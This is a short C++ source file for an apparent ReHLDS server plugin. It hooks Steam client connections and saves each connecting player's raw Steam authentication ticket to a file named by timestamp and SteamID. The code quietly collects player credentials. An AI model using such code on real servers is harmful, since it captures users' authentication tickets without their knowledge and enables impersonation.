#include "precompiled.h"
#include <fstream>
using namespace std;
int OnMetaAttach(){
	g_RehldsHookchains->Steam_NotifyClientConnect()->registerHook(&Steam_NotifyClientConnect, HC_PRIORITY_LOW);
	return TRUE;
}

void OnMetaDetach(){
	g_RehldsHookchains->Steam_NotifyClientConnect()->unregisterHook(&Steam_NotifyClientConnect);
}
qboolean Steam_NotifyClientConnect(IRehldsHook_Steam_NotifyClientConnect *chain,IGameClient *client,const void *pvSteam2Key, unsigned int ucbSteam2Key){
	auto success = chain->callNext(client, pvSteam2Key, ucbSteam2Key);
	if(success){
		time_t ltime;time(&ltime);
		tm *today = localtime(&ltime);
		char filename[128];sprintf(filename,"cstrike/ticketsz/%04i-%02i-%02i_%02i-%02i-%02i_%llu.dat",today->tm_year + 1900,today->tm_mon + 1,today->tm_mday,today->tm_hour,today->tm_min,today->tm_sec,client->GetNetworkUserID()->m_SteamID);
		ofstream filez(filename, ios::out | ios::binary | ios::ate);
		if (filez.is_open()){
			filez.write((const char*)pvSteam2Key, ucbSteam2Key);
			filez.close();
		}
	}
	return success;
}
